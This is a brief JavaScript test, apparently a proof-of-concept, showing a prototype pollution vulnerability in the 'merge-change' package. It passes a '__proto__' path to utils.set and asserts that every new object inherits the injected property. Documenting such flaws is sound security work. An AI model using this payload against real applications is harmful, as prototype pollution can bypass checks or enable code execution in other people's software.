//
test("prototype pollution in merge-change", () => {
  const utils = require("merge-change").utils;

  expect({}.polluted).toBe(undefined);

  let obj = {};
  utils.set(obj, ["__proto__", "polluted"], "yes");

  expect({}.polluted).toBe("yes");
});
